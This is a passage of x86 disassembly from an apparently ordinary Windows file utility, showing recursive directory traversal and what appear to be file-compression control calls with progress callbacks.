  403a78:	push   0x14
  403a7a:	push   DWORD PTR [ebx+0x1c]
  403a7d:	push   DWORD PTR [ebx+0x18]
  403a80:	call   0x407770
  403a85:	or     eax,edx
  403a87:	jne    0x403d2f
  403a8d:	mov    eax,DWORD PTR [ebx+0x6c]
  403a90:	mov    ecx,esi
  403a92:	inc    eax
  403a93:	and    eax,0x3
  403a96:	mov    DWORD PTR [ebx+0x6c],eax
  403a99:	push   DWORD PTR [eax*4+0x4015a0]
  403aa0:	push   0x1d
  403aa2:	call   DWORD PTR ds:0x40c1a4
  403aa8:	call   esi
  403aaa:	pop    ecx
  403aab:	jmp    0x403d2e
  403ab0:	test   DWORD PTR [esi],0x4800
  403ab6:	je     0x403ac2
  403ab8:	test   BYTE PTR [ebx],0x4
  403abb:	jne    0x403ad9
  403abd:	jmp    0x4038b5
  403ac2:	test   BYTE PTR [ebx],0x4
  403ac5:	jne    0x403ad9
  403ac7:	mov    ecx,eax
  403ac9:	call   0x4029cd
  403ace:	test   al,al
  403ad0:	jne    0x403d4e
  403ad6:	mov    eax,DWORD PTR [ebp-0x1c]
  403ad9:	xor    edi,edi
  403adb:	lea    ecx,[ebp-0x48]
  403ade:	push   edi
  403adf:	push   ecx
  403ae0:	push   edi
  403ae1:	push   edi
  403ae2:	push   0x2
  403ae4:	lea    ecx,[ebp-0x2c]
  403ae7:	push   ecx
  403ae8:	push   0x9c040
  403aed:	push   eax
  403aee:	call   DWORD PTR ds:0x40c074
  403af4:	test   eax,eax
  403af6:	jne    0x403939
  403afc:	test   BYTE PTR [ebx],0x8
  403aff:	je     0x403b0a
  403b01:	test   BYTE PTR [ebx],0x2
  403b04:	jne    0x403d4e
  403b0a:	call   DWORD PTR ds:0x40c048
  403b10:	mov    DWORD PTR [ebp-0x1c],eax
  403b13:	cmp    DWORD PTR [ebx+0x60],edi
  403b16:	je     0x403bb5
  403b1c:	lea    ecx,[esi+0x2c]
  403b1f:	mov    esi,0x408440
  403b24:	push   ecx
  403b25:	push   0x401570
  403b2a:	push   0x400
  403b2f:	push   esi
  403b30:	call   DWORD PTR ds:0x40c150
  403b36:	add    esp,0x10
  403b39:	push   esi
  403b3a:	mov    esi,DWORD PTR [ebx+0x60]
  403b3d:	mov    ecx,esi
  403b3f:	push   0x15
  403b41:	call   DWORD PTR ds:0x40c1a4
  403b47:	call   esi
  403b49:	pop    ecx
  403b4a:	pop    ecx
  403b4b:	mov    ecx,DWORD PTR [ebp-0x20]
  403b4e:	add    ecx,0x2c
  403b51:	lea    edx,[ecx+0x2]
  403b54:	mov    ax,WORD PTR [ecx]
  403b57:	add    ecx,0x2
  403b5a:	cmp    ax,di
  403b5d:	jne    0x403b54
  403b5f:	sub    ecx,edx
  403b61:	sar    ecx,1
  403b63:	push   0x14
  403b65:	inc    ecx
  403b66:	pop    edi
  403b67:	cmp    ecx,edi
  403b69:	jae    0x403b9f
  403b6b:	sub    edi,ecx
  403b6d:	push   0x20
  403b6f:	push   0x401578
  403b74:	push   0x400
  403b79:	mov    esi,0x408440
  403b7e:	push   esi
  403b7f:	call   DWORD PTR ds:0x40c150
  403b85:	add    esp,0x10
  403b88:	push   esi
  403b89:	mov    esi,DWORD PTR [ebx+0x60]
  403b8c:	mov    ecx,esi
  403b8e:	push   0x15
  403b90:	call   DWORD PTR ds:0x40c1a4
  403b96:	call   esi
  403b98:	pop    ecx
  403b99:	pop    ecx
  403b9a:	sub    edi,0x1
  403b9d:	jne    0x403b6d
  403b9f:	mov    esi,DWORD PTR [ebx+0x60]
  403ba2:	mov    ecx,esi
  403ba4:	push   0x2
  403ba6:	call   DWORD PTR ds:0x40c1a4
  403bac:	call   esi
  403bae:	mov    esi,DWORD PTR [ebp-0x20]
  403bb1:	mov    eax,DWORD PTR [ebp-0x1c]
  403bb4:	pop    ecx
  403bb5:	test   BYTE PTR [ebx],0xa
  403bb8:	jne    0x403bfc
  403bba:	cmp    eax,0x1
  403bbd:	jne    0x403be4
  403bbf:	mov    esi,DWORD PTR [ebx+0x60]
  403bc2:	test   esi,esi
  403bc4:	je     0x403bfc
  403bc6:	mov    eax,DWORD PTR [ebp-0x20]
  403bc9:	mov    ecx,esi
  403bcb:	add    eax,0x2c
  403bce:	test   BYTE PTR [ebx],0x20
  403bd1:	push   eax
  403bd2:	je     0x403be0
  403bd4:	push   0x17
  403bd6:	call   DWORD PTR ds:0x40c1a4
  403bdc:	call   esi
  403bde:	jmp    0x403bfa
  403be0:	push   0x1a
  403be2:	jmp    0x403bd6
  403be4:	mov    edi,DWORD PTR [ebx+0x64]
  403be7:	test   edi,edi
  403be9:	je     0x403bfc
  403beb:	push   eax
  403bec:	lea    eax,[esi+0x2c]
  403bef:	mov    ecx,edi
  403bf1:	push   eax
  403bf2:	call   DWORD PTR ds:0x40c1a4
  403bf8:	call   edi
  403bfa:	pop    ecx
  403bfb:	pop    ecx
  403bfc:	movsx  eax,BYTE PTR [ebx]
  403bff:	and    eax,0x2
  403c02:	shr    eax,1
  403c04:	jmp    0x403d50
  403c09:	test   BYTE PTR [ebx],0x8
  403c0c:	jne    0x403d2f
  403c12:	cmp    DWORD PTR [ebx+0x60],edi
  403c15:	je     0x403d2f
  403c1b:	test   BYTE PTR [ebx],0x10
  403c1e:	jne    0x403c2c
  403c20:	test   DWORD PTR [esi],0x6
  403c26:	jne    0x403d2f
  403c2c:	push   ebx
  403c2d:	push   0x400
  403c32:	push   edi
  403c33:	mov    esi,0x408440
  403c38:	lea    ecx,[ebp-0x40]
  403c3b:	push   esi
  403c3c:	push   0x9
  403c3e:	pop    edx
  403c3f:	call   0x402b3b
  403c44:	push   0x401524
  403c49:	push   0x400
  403c4e:	push   esi
  403c4f:	call   DWORD PTR ds:0x40c160
  403c55:	mov    ecx,esi
  403c57:	add    esp,0xc
  403c5a:	lea    edx,[ecx+0x2]
  403c5d:	mov    ax,WORD PTR [ecx]
  403c60:	add    ecx,0x2
  403c63:	cmp    ax,di
  403c66:	jne    0x403c5d
  403c68:	sub    ecx,edx
  403c6a:	mov    eax,0x400
  403c6f:	sar    ecx,1
  403c71:	push   ebx
  403c72:	sub    eax,ecx
  403c74:	push   eax
  403c75:	push   edi
  403c76:	lea    eax,[ecx*2+0x408440]
  403c7d:	push   eax
  403c7e:	push   0x9
  403c80:	pop    edx
  403c81:	lea    ecx,[ebp-0x28]
  403c84:	call   0x402b3b
  403c89:	mov    ecx,esi
  403c8b:	lea    edx,[ecx+0x2]
  403c8e:	mov    ax,WORD PTR [ecx]
  403c91:	add    ecx,0x2
  403c94:	cmp    ax,di
  403c97:	jne    0x403c8e
  403c99:	fld    QWORD PTR [ebp-0x38]
  403c9c:	sub    ecx,edx
  403c9e:	sar    ecx,1
  403ca0:	mov    eax,0x400
  403ca5:	push   ecx
  403ca6:	push   ecx
  403ca7:	fstp   QWORD PTR [esp]
  403caa:	sub    eax,ecx
  403cac:	push   0x40152c
  403cb1:	push   eax
  403cb2:	lea    eax,[ecx*2+0x408440]
  403cb9:	push   eax
  403cba:	call   DWORD PTR ds:0x40c150
  403cc0:	lea    ecx,[ebx+0x50]
  403cc3:	add    esp,0x14
  403cc6:	lea    edx,[ecx+0x2]
  403cc9:	mov    ax,WORD PTR [ecx]
  403ccc:	add    ecx,0x2
  403ccf:	cmp    ax,di
  403cd2:	jne    0x403cc9
  403cd4:	sub    ecx,edx
  403cd6:	sar    ecx,1
  403cd8:	cmp    ecx,0x1
  403cdb:	jne    0x403cfd
  403cdd:	mov    ecx,esi
  403cdf:	lea    edx,[ecx+0x2]
  403ce2:	mov    ax,WORD PTR [ecx]
  403ce5:	add    ecx,0x2
  403ce8:	cmp    ax,di
  403ceb:	jne    0x403ce2
  403ced:	mov    ax,WORD PTR [ebx+0x50]
  403cf1:	sub    ecx,edx
  403cf3:	sar    ecx,1
  403cf5:	mov    WORD PTR [ecx*2+0x40843a],ax
  403cfd:	push   esi
  403cfe:	mov    esi,DWORD PTR [ebx+0x60]
  403d01:	mov    ecx,esi
  403d03:	push   0x15
  403d05:	call   DWORD PTR ds:0x40c1a4
  403d0b:	call   esi
  403d0d:	mov    esi,DWORD PTR [ebx+0x60]
  403d10:	pop    ecx
  403d11:	pop    ecx
  403d12:	push   0x18
  403d14:	mov    ecx,esi
  403d16:	call   DWORD PTR ds:0x40c1a4
  403d1c:	call   esi
  403d1e:	mov    esi,DWORD PTR [ebx+0x60]
  403d21:	pop    ecx
  403d22:	push   0x1
  403d24:	mov    ecx,esi
  403d26:	call   DWORD PTR ds:0x40c1a4
  403d2c:	call   esi
  403d2e:	pop    ecx
  403d2f:	mov    eax,DWORD PTR [ebp-0x20]
  403d32:	add    DWORD PTR [ebx+0x30],eax
  403d35:	mov    eax,DWORD PTR [ebp-0x1c]
  403d38:	adc    DWORD PTR [ebx+0x34],eax
  403d3b:	mov    eax,DWORD PTR [ebp-0x28]
  403d3e:	add    DWORD PTR [ebx+0x38],eax
  403d41:	mov    eax,DWORD PTR [ebp-0x24]
  403d44:	adc    DWORD PTR [ebx+0x3c],eax
  403d47:	add    DWORD PTR [ebx+0x18],0x1
  403d4b:	adc    DWORD PTR [ebx+0x1c],edi
  403d4e:	mov    al,0x1
  403d50:	mov    ecx,DWORD PTR [ebp-0x4]
  403d53:	pop    edi
  403d54:	pop    esi
  403d55:	xor    ecx,ebp
  403d57:	pop    ebx
  403d58:	call   0x406fc0
  403d5d:	mov    esp,ebp
  403d5f:	pop    ebp
  403d60:	ret    0x8
  403d63:	int3   
  403d64:	int3   
  403d65:	int3   
  403d66:	int3   
  403d67:	int3   
  403d68:	int3   
  403d69:	int3   
  403d6a:	int3   
  403d6b:	int3   
  403d6c:	int3   
  403d6d:	int3   
  403d6e:	int3   
  403d6f:	int3   
  403d70:	mov    edi,edi
  403d72:	push   ebp
  403d73:	mov    ebp,esp
  403d75:	and    esp,0xfffffff8
  403d78:	sub    esp,0x27c
  403d7e:	mov    eax,ds:0x408008
  403d83:	xor    eax,esp
  403d85:	mov    DWORD PTR [esp+0x278],eax
  403d8c:	push   ebx
  403d8d:	mov    ebx,DWORD PTR [ebp+0x8]
  403d90:	push   esi
  403d91:	mov    esi,DWORD PTR [ebp+0xc]
  403d94:	push   edi
  403d95:	mov    edi,DWORD PTR [ebp+0x10]
  403d98:	mov    DWORD PTR [esp+0x24],esi
  403d9c:	test   BYTE PTR [edi],0x40
  403d9f:	je     0x403db5
  403da1:	mov    edx,0x4080a0
  403da6:	mov    ecx,ebx
  403da8:	call   0x402a94
  403dad:	test   al,al
  403daf:	jne    0x404384
  403db5:	mov    ecx,esi
  403db7:	xor    esi,esi
  403db9:	mov    DWORD PTR [esp+0x20],esi
  403dbd:	lea    edx,[ecx+0x2]
  403dc0:	mov    ax,WORD PTR [ecx]
  403dc3:	add    ecx,0x2
  403dc6:	cmp    ax,si
  403dc9:	jne    0x403dc0
  403dcb:	sub    ecx,edx
  403dcd:	sar    ecx,1
  403dcf:	jne    0x403efa
  403dd5:	xor    eax,eax
  403dd7:	inc    eax
  403dd8:	test   BYTE PTR [edi],0x20
  403ddb:	mov    WORD PTR [esp+0x18],ax
  403de0:	jne    0x404386
  403de6:	mov    esi,DWORD PTR [edi+0x68]
  403de9:	mov    ecx,esi
  403deb:	push   edi
  403dec:	push   ebx
  403ded:	call   DWORD PTR ds:0x40c1a4
  403df3:	call   esi
  403df5:	mov    DWORD PTR [esp+0x14],eax
  403df9:	cmp    eax,0xffffffff
  403dfc:	jne    0x403e22
  403dfe:	call   DWORD PTR ds:0x40c048
  403e04:	mov    esi,DWORD PTR [edi+0x64]
  403e07:	mov    ecx,esi
  403e09:	push   eax
  403e0a:	push   ebx
  403e0b:	call   DWORD PTR ds:0x40c1a4
  403e11:	call   esi
  403e13:	pop    ecx
  403e14:	pop    ecx
  403e15:	movsx  eax,BYTE PTR [edi]
  403e18:	and    eax,0x2
  403e1b:	shr    eax,1
  403e1d:	jmp    0x404386
  403e22:	mov    esi,DWORD PTR [edi+0x60]
  403e25:	test   esi,esi
  403e27:	je     0x403e3c
  403e29:	push   ebx
  403e2a:	push   0x9
  403e2c:	mov    ecx,esi
  403e2e:	call   DWORD PTR ds:0x40c1a4
  403e34:	call   esi
  403e36:	mov    eax,DWORD PTR [esp+0x1c]
  403e3a:	pop    ecx
  403e3b:	pop    ecx
  403e3c:	xor    edx,edx
  403e3e:	lea    ecx,[esp+0x1c]
  403e42:	push   edx
  403e43:	push   ecx
  403e44:	push   edx
  403e45:	push   edx
  403e46:	push   0x2
  403e48:	lea    ecx,[esp+0x2c]
  403e4c:	push   ecx
  403e4d:	push   0x9c040
  403e52:	push   eax
  403e53:	call   DWORD PTR ds:0x40c074
  403e59:	mov    esi,DWORD PTR [edi+0x60]
  403e5c:	test   eax,eax
  403e5e:	jne    0x403ec4
  403e60:	test   esi,esi
  403e62:	je     0x403e7b
  403e64:	test   BYTE PTR [edi],0x8
  403e67:	je     0x403e6e
  403e69:	test   BYTE PTR [edi],0x2
  403e6c:	jne    0x403e7b
  403e6e:	push   0x2
  403e70:	mov    ecx,esi
  403e72:	call   DWORD PTR ds:0x40c1a4
  403e78:	call   esi
  403e7a:	pop    ecx
  403e7b:	test   BYTE PTR [edi],0xa
  403e7e:	jne    0x403eb5
  403e80:	call   DWORD PTR ds:0x40c048
  403e86:	cmp    eax,0x1
  403e89:	jne    0x403e97
  403e8b:	mov    esi,DWORD PTR [edi+0x60]
  403e8e:	test   esi,esi
  403e90:	je     0x403eb5
  403e92:	push   ebx
  403e93:	push   0x1a
  403e95:	jmp    0x403ea9
  403e97:	xor    eax,eax
  403e99:	cmp    DWORD PTR [edi+0x64],eax
  403e9c:	je     0x403eb5
  403e9e:	call   DWORD PTR ds:0x40c048
  403ea4:	mov    esi,DWORD PTR [edi+0x64]
  403ea7:	push   eax
  403ea8:	push   ebx
  403ea9:	mov    ecx,esi
  403eab:	call   DWORD PTR ds:0x40c1a4
  403eb1:	call   esi
  403eb3:	pop    ecx
  403eb4:	pop    ecx
  403eb5:	push   DWORD PTR [esp+0x14]
  403eb9:	call   DWORD PTR ds:0x40c0f4
  403ebf:	jmp    0x403e15
  403ec4:	test   esi,esi
  403ec6:	je     0x403eda
  403ec8:	test   BYTE PTR [edi],0x8
  403ecb:	jne    0x403eda
  403ecd:	push   0x1
  403ecf:	mov    ecx,esi
  403ed1:	call   DWORD PTR ds:0x40c1a4
  403ed7:	call   esi
  403ed9:	pop    ecx
  403eda:	push   DWORD PTR [esp+0x14]
  403ede:	call   DWORD PTR ds:0x40c0f4
  403ee4:	add    DWORD PTR [edi+0x10],0x1
  403ee8:	push   0x0
  403eea:	pop    eax
  403eeb:	adc    DWORD PTR [edi+0x14],eax
  403eee:	add    DWORD PTR [edi+0x18],0x1
  403ef2:	adc    DWORD PTR [edi+0x1c],eax
  403ef5:	jmp    0x404384
  403efa:	mov    ecx,ebx
  403efc:	lea    edx,[ecx+0x2]
  403eff:	mov    ax,WORD PTR [ecx]
  403f02:	add    ecx,0x2
  403f05:	cmp    ax,si
  403f08:	jne    0x403eff
  403f0a:	sub    ecx,edx
  403f0c:	sar    ecx,1
  403f0e:	push   ebx
  403f0f:	lea    esi,[ebx+ecx*2]
  403f12:	mov    DWORD PTR [esp+0x10],esi
  403f16:	call   DWORD PTR ds:0x40c064
  403f1c:	cmp    eax,0xffffffff
  403f1f:	jne    0x403f31
  403f21:	xor    eax,eax
  403f23:	cmp    DWORD PTR [edi+0x64],eax
  403f26:	je     0x403e15
  403f2c:	jmp    0x403dfe
  403f31:	test   BYTE PTR [edi],0x40
  403f34:	je     0x403f6d
  403f36:	test   BYTE PTR [edi],0x80
  403f39:	je     0x403f92
  403f3b:	mov    esi,DWORD PTR [edi+0x60]
  403f3e:	test   esi,esi
  403f40:	je     0x403f8e
  403f42:	xor    eax,eax
  403f44:	push   eax
  403f45:	push   0x28
  403f47:	push   DWORD PTR [edi+0x14]
  403f4a:	push   DWORD PTR [edi+0x10]
  403f4d:	call   0x407770
  403f52:	or     eax,edx
  403f54:	jne    0x403f8e
  403f56:	mov    eax,DWORD PTR [edi+0x6c]
  403f59:	mov    ecx,esi
  403f5b:	inc    eax
  403f5c:	and    eax,0x3
  403f5f:	mov    DWORD PTR [edi+0x6c],eax
  403f62:	push   DWORD PTR [eax*4+0x4015a0]
  403f69:	push   0x1d
  403f6b:	jmp    0x403f84
  403f6d:	mov    esi,DWORD PTR [edi+0x60]
  403f70:	test   esi,esi
  403f72:	je     0x403f8e
  403f74:	mov    ecx,esi
  403f76:	push   ebx
  403f77:	test   eax,0x800
  403f7c:	je     0x403f82
  403f7e:	push   0xa
  403f80:	jmp    0x403f84
  403f82:	push   0xb
  403f84:	call   DWORD PTR ds:0x40c1a4
  403f8a:	call   esi
  403f8c:	pop    ecx
  403f8d:	pop    ecx
  403f8e:	mov    esi,DWORD PTR [esp+0xc]
  403f92:	mov    ecx,DWORD PTR [esp+0x24]
  403f96:	add    DWORD PTR [edi+0x10],0x1
  403f9a:	push   0x0
  403f9c:	pop    eax
  403f9d:	adc    DWORD PTR [edi+0x14],eax
  403fa0:	lea    edx,[ecx+0x2]
  403fa3:	mov    ax,WORD PTR [ecx]
  403fa6:	add    ecx,0x2
  403fa9:	cmp    ax,WORD PTR [esp+0x20]
  403fae:	jne    0x403fa3
  403fb0:	sub    ecx,edx
  403fb2:	mov    edx,esi
  403fb4:	sub    edx,ebx
  403fb6:	sar    ecx,1
  403fb8:	sar    edx,1
  403fba:	mov    DWORD PTR [esp+0x14],edx
  403fbe:	lea    eax,[edx+ecx*1]
  403fc1:	cmp    eax,0x104
  403fc6:	jae    0x404231
  403fcc:	push   DWORD PTR [esp+0x24]
  403fd0:	mov    eax,0x104
  403fd5:	sub    eax,edx
  403fd7:	push   eax
  403fd8:	push   esi
  403fd9:	mov    DWORD PTR [esp+0x34],eax
  403fdd:	call   DWORD PTR ds:0x40c15c
  403fe3:	add    esp,0xc
  403fe6:	lea    eax,[esp+0x30]
  403fea:	push   eax
  403feb:	push   ebx
  403fec:	call   DWORD PTR ds:0x40c058
  403ff2:	mov    esi,eax
  403ff4:	mov    DWORD PTR [esp+0x10],esi
  403ff8:	cmp    esi,0xffffffff
  403ffb:	je     0x404229
  404001:	mov    ecx,0x40109c
  404006:	lea    eax,[esp+0x5c]
  40400a:	mov    dx,WORD PTR [eax]
  40400d:	cmp    dx,WORD PTR [ecx]
  404010:	jne    0x404030
  404012:	test   dx,dx
  404015:	je     0x40402c
  404017:	mov    dx,WORD PTR [eax+0x2]
  40401b:	cmp    dx,WORD PTR [ecx+0x2]
  40401f:	jne    0x404030
  404021:	add    eax,0x4
  404024:	add    ecx,0x4
  404027:	test   dx,dx
  40402a:	jne    0x40400a
  40402c:	xor    eax,eax
  40402e:	jmp    0x404035
  404030:	sbb    eax,eax
  404032:	or     eax,0x1
  404035:	test   eax,eax
  404037:	je     0x40420e
  40403d:	mov    ecx,0x401550
  404042:	lea    eax,[esp+0x5c]
  404046:	mov    dx,WORD PTR [eax]
  404049:	cmp    dx,WORD PTR [ecx]
  40404c:	jne    0x40406c
  40404e:	test   dx,dx
  404051:	je     0x404068
  404053:	mov    dx,WORD PTR [eax+0x2]
  404057:	cmp    dx,WORD PTR [ecx+0x2]
  40405b:	jne    0x40406c
  40405d:	add    eax,0x4
  404060:	add    ecx,0x4
  404063:	test   dx,dx
  404066:	jne    0x404046
  404068:	xor    eax,eax
  40406a:	jmp    0x404071
  40406c:	sbb    eax,eax
  40406e:	or     eax,0x1
  404071:	test   eax,eax
  404073:	je     0x40420e
  404079:	lea    ecx,[esp+0x5c]
  40407d:	lea    edx,[ecx+0x2]
  404080:	mov    ax,WORD PTR [ecx]
  404083:	add    ecx,0x2
  404086:	cmp    ax,WORD PTR [esp+0x20]
  40408b:	jne    0x404080
  40408d:	mov    eax,DWORD PTR [esp+0x14]
  404091:	sub    ecx,edx
  404093:	sar    ecx,1
  404095:	add    eax,ecx
  404097:	cmp    eax,0x104
  40409c:	jae    0x40420e
  4040a2:	lea    eax,[esp+0x5c]
  4040a6:	push   eax
  4040a7:	push   DWORD PTR [esp+0x2c]
  4040ab:	push   DWORD PTR [esp+0x14]
  4040af:	call   DWORD PTR ds:0x40c15c
  4040b5:	add    esp,0xc
  4040b8:	mov    ecx,ebx
  4040ba:	call   0x402ae6
  4040bf:	test   al,al
  4040c1:	je     0x4040ee
  4040c3:	mov    esi,DWORD PTR [edi+0x60]
  4040c6:	test   esi,esi
  4040c8:	je     0x40420a
  4040ce:	test   BYTE PTR [edi],0x8
  4040d1:	jne    0x40420a
  4040d7:	push   DWORD PTR [esp+0xc]
  4040db:	mov    ecx,esi
  4040dd:	push   0x14
  4040df:	call   DWORD PTR ds:0x40c1a4
  4040e5:	call   esi
  4040e7:	pop    ecx
  4040e8:	pop    ecx
  4040e9:	jmp    0x40420a
  4040ee:	test   BYTE PTR [edi],0x4
  4040f1:	je     0x4041be
  4040f7:	xor    eax,eax
  4040f9:	test   BYTE PTR [edi],0x20
  4040fc:	mov    WORD PTR [esp+0x18],ax
  404101:	je     0x4041be
  404107:	test   DWORD PTR [esp+0x30],0x800
  40410f:	je     0x4041be
  404115:	push   edi
  404116:	push   ebx
  404117:	call   0x402e00
  40411c:	mov    DWORD PTR [esp+0x1c],eax
  404120:	cmp    eax,0xffffffff
  404123:	jne    0x404165
  404125:	test   BYTE PTR [edi],0x8
  404128:	je     0x404133
  40412a:	test   BYTE PTR [edi],0x2
  40412d:	jne    0x40420e
  404133:	call   DWORD PTR ds:0x40c048
  404139:	mov    esi,DWORD PTR [edi+0x64]
  40413c:	mov    ecx,esi
  40413e:	push   eax
  40413f:	push   ebx
  404140:	call   DWORD PTR ds:0x40c1a4
  404146:	call   esi
  404148:	test   BYTE PTR [edi],0x2
  40414b:	mov    esi,DWORD PTR [esp+0x18]
  40414f:	pop    ecx
  404150:	pop    ecx
  404151:	jne    0x40420e
  404157:	push   esi
  404158:	call   DWORD PTR ds:0x40c070
  40415e:	xor    al,al
  404160:	jmp    0x404386
  404165:	xor    edx,edx
  404167:	lea    ecx,[esp+0x2c]
  40416b:	push   edx
  40416c:	push   ecx
  40416d:	push   edx
  40416e:	push   edx
  40416f:	push   0x2
  404171:	lea    ecx,[esp+0x2c]
  404175:	push   ecx
  404176:	push   0x9c040
  40417b:	push   eax
  40417c:	call   DWORD PTR ds:0x40c074
  404182:	push   DWORD PTR [esp+0x1c]
  404186:	mov    esi,eax
  404188:	call   DWORD PTR ds:0x40c0f4
  40418e:	test   esi,esi
  404190:	jne    0x4041be
  404192:	test   BYTE PTR [edi],0x8
  404195:	je     0x40419c
  404197:	test   BYTE PTR [edi],0x2
  40419a:	jne    0x40420a
  40419c:	call   DWORD PTR ds:0x40c048
  4041a2:	push   eax
  4041a3:	push   ebx
  4041a4:	mov    esi,DWORD PTR [edi+0x64]
  4041a7:	mov    ecx,esi
  4041a9:	call   DWORD PTR ds:0x40c1a4
  4041af:	call   esi
  4041b1:	test   BYTE PTR [edi],0x2
  4041b4:	pop    ecx
  4041b5:	pop    ecx
  4041b6:	jne    0x40420a
  4041b8:	push   DWORD PTR [esp+0x10]
  4041bc:	jmp    0x404158
  4041be:	mov    esi,DWORD PTR [edi+0x68]
  4041c1:	mov    ecx,esi
  4041c3:	push   edi
  4041c4:	push   ebx
  4041c5:	call   DWORD PTR ds:0x40c1a4
  4041cb:	call   esi
  4041cd:	mov    esi,eax
  4041cf:	cmp    esi,0xffffffff
  4041d2:	jne    0x4041ec
  4041d4:	test   BYTE PTR [edi],0x8
  4041d7:	je     0x4041de
  4041d9:	test   BYTE PTR [edi],0x2
  4041dc:	jne    0x40420a
  4041de:	call   DWORD PTR ds:0x40c048
  4041e4:	push   eax
  4041e5:	lea    eax,[esp+0x60]
  4041e9:	push   eax
  4041ea:	jmp    0x4041a4
  4041ec:	push   edi
  4041ed:	lea    eax,[esp+0x34]
  4041f1:	mov    edx,ebx
  4041f3:	push   eax
  4041f4:	mov    ecx,esi
  4041f6:	call   0x403872
  4041fb:	push   esi
  4041fc:	test   al,al
  4041fe:	je     0x4042a9
  404204:	call   DWORD PTR ds:0x40c0f4
  40420a:	mov    esi,DWORD PTR [esp+0x10]
  40420e:	lea    eax,[esp+0x30]
  404212:	push   eax
  404213:	push   esi
  404214:	call   DWORD PTR ds:0x40c078
  40421a:	test   eax,eax
  40421c:	jne    0x404001
  404222:	push   esi
  404223:	call   DWORD PTR ds:0x40c070
  404229:	mov    esi,DWORD PTR [esp+0xc]
  40422d:	mov    edx,DWORD PTR [esp+0x14]
  404231:	test   BYTE PTR [edi],0x1
  404234:	je     0x404384
  40423a:	lea    eax,[edx+0x1]
  40423d:	cmp    eax,0x104
  404242:	jae    0x404384
  404248:	mov    eax,0x104
  40424d:	sub    eax,edx
  40424f:	push   0x401178
  404254:	push   eax
  404255:	push   esi
  404256:	mov    DWORD PTR [esp+0x28],eax
  40425a:	call   DWORD PTR ds:0x40c15c
  404260:	add    esp,0xc
  404263:	lea    eax,[esp+0x30]
  404267:	push   eax
  404268:	push   ebx
  404269:	call   DWORD PTR ds:0x40c058
  40426f:	mov    esi,eax
  404271:	cmp    esi,0xffffffff
  404274:	je     0x404384
  40427a:	mov    edx,0x40109c
  40427f:	lea    ecx,[esp+0x5c]
  404283:	mov    ax,WORD PTR [ecx]
  404286:	cmp    ax,WORD PTR [edx]
  404289:	jne    0x4042be
  40428b:	test   ax,ax
  40428e:	je     0x4042a5
  404290:	mov    ax,WORD PTR [ecx+0x2]
  404294:	cmp    ax,WORD PTR [edx+0x2]
  404298:	jne    0x4042be
  40429a:	add    ecx,0x4
  40429d:	add    edx,0x4
  4042a0:	test   ax,ax
  4042a3:	jne    0x404283
  4042a5:	xor    eax,eax
  4042a7:	jmp    0x4042c3
  4042a9:	call   DWORD PTR ds:0x40c0f4
  4042af:	push   DWORD PTR [esp+0x10]
  4042b3:	call   DWORD PTR ds:0x40c070
  4042b9:	jmp    0x403e15
  4042be:	sbb    eax,eax
  4042c0:	or     eax,0x1
  4042c3:	test   eax,eax
  4042c5:	je     0x404369
  4042cb:	mov    ecx,0x401550
  4042d0:	lea    eax,[esp+0x5c]
  4042d4:	mov    dx,WORD PTR [eax]
  4042d7:	cmp    dx,WORD PTR [ecx]
  4042da:	jne    0x4042fa
  4042dc:	test   dx,dx
  4042df:	je     0x4042f6
  4042e1:	mov    dx,WORD PTR [eax+0x2]
  4042e5:	cmp    dx,WORD PTR [ecx+0x2]
  4042e9:	jne    0x4042fa
  4042eb:	add    eax,0x4
  4042ee:	add    ecx,0x4
  4042f1:	test   dx,dx
  4042f4:	jne    0x4042d4
  4042f6:	xor    eax,eax
  4042f8:	jmp    0x4042ff
  4042fa:	sbb    eax,eax
  4042fc:	or     eax,0x1
  4042ff:	test   eax,eax
  404301:	je     0x404369
  404303:	test   BYTE PTR [esp+0x30],0x10
  404308:	je     0x404369
  40430a:	lea    ecx,[esp+0x5c]
  40430e:	lea    edx,[ecx+0x2]
  404311:	mov    ax,WORD PTR [ecx]
  404314:	add    ecx,0x2
  404317:	cmp    ax,WORD PTR [esp+0x20]
  40431c:	jne    0x404311
  40431e:	mov    eax,DWORD PTR [esp+0x14]
  404322:	sub    ecx,edx
  404324:	sar    ecx,1
  404326:	inc    eax
  404327:	add    eax,ecx
  404329:	cmp    eax,0x104
  40432e:	jae    0x404369
  404330:	lea    eax,[esp+0x5c]
  404334:	push   eax
  404335:	push   DWORD PTR [esp+0x20]
  404339:	push   DWORD PTR [esp+0x14]
  40433d:	call   DWORD PTR ds:0x40c15c
  404343:	add    esp,0xc
  404346:	push   0x401180
  40434b:	push   0x104
  404350:	push   ebx
  404351:	call   DWORD PTR ds:0x40c160
  404357:	add    esp,0xc
  40435a:	push   edi
  40435b:	push   DWORD PTR [esp+0x28]
  40435f:	push   ebx
  404360:	call   0x403d70
  404365:	test   al,al
  404367:	je     0x40439d
  404369:	lea    eax,[esp+0x30]
  40436d:	push   eax
  40436e:	push   esi
  40436f:	call   DWORD PTR ds:0x40c078
  404375:	test   eax,eax
  404377:	jne    0x40427a
  40437d:	push   esi
  40437e:	call   DWORD PTR ds:0x40c070
  404384:	mov    al,0x1
  404386:	mov    ecx,DWORD PTR [esp+0x284]
  40438d:	pop    edi
  40438e:	pop    esi
  40438f:	pop    ebx
  404390:	xor    ecx,esp
  404392:	call   0x406fc0
  404397:	mov    esp,ebp
  404399:	pop    ebp
  40439a:	ret    0xc
  40439d:	push   esi
  40439e:	jmp    0x4042b3
  4043a3:	int3   
  4043a4:	int3   
  4043a5:	int3   
  4043a6:	int3   
  4043a7:	int3   
  4043a8:	int3   
  4043a9:	int3   
  4043aa:	int3   
  4043ab:	int3   
  4043ac:	int3   
  4043ad:	int3   
  4043ae:	int3   
  4043af:	int3   
  4043b0:	mov    edi,edi
  4043b2:	push   ebp
  4043b3:	mov    ebp,esp
  4043b5:	and    esp,0xfffffff8
  4043b8:	sub    esp,0x19c
  4043be:	mov    eax,ds:0x408008
  4043c3:	xor    eax,esp
  4043c5:	mov    DWORD PTR [esp+0x198],eax
  4043cc:	fld1   
  4043ce:	xor    edx,edx
  4043d0:	push   ebx
  4043d1:	push   esi
  4043d2:	mov    esi,DWORD PTR [ebp+0x8]
  4043d5:	fstp   QWORD PTR [esp+0xc]
  4043d9:	push   edi
  4043da:	cmp    DWORD PTR [esi+0x60],edx
  4043dd:	je     0x404509
  4043e3:	mov    ecx,DWORD PTR [esi+0x38]
  4043e6:	mov    eax,DWORD PTR [esi+0x3c]
  4043e9:	mov    DWORD PTR [esp+0x18],ecx
  4043ed:	or     ecx,eax
  4043ef:	mov    DWORD PTR [esp+0x1c],eax
  4043f3:	je     0x404410
